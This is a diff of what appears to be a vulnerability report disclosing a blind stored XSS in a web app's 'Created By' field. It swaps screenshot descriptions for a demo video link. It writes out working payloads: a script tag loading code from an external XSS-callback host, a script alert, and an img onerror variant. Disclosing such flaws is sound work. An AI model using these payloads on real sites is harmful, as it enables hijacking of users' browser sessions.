@@ -28,16 +28,12 @@ http://kzlabs.com/63.php
 ```'"><script src=https://xss.report/c/xamoo></script>```
 
 ## Proof of Concept Request
-  ```Screenshot 1``` — The Reports listing page showing the raw script payload stored as-is in row #7 under "Created By" as `<script>alert(1)</script>`, meaning the app saved it exactly as typed with no filtering at all.
-  <img width="1920" height="1080" alt="Screenshot From 2026-05-24 22-06-28" src="https://github.com/user-attachments/assets/72b17955-30e1-46f4-8568-1dd9a25a70ef" />
+Video Demonstrated How the Blind XSS works
 
 
+https://github.com/user-attachments/assets/572dad72-23c1-44b6-ab02-e02f4df02d45
 
 
-
- ```Screenshot 2 : ``` Used an img tag payload `'"><img src=x onerror=a>lert(1)` this time and the alert still triggered on page load, which confirms it's not just script tags that work here. Any HTML payload gets executed.
-
- <img width="1920" height="1080" alt="Screenshot From 2026-05-24 22-12-45" src="https://github.com/user-attachments/assets/e4be7fb7-f9c0-42ef-a3c3-9a9ce011bd53" />
 
 
 
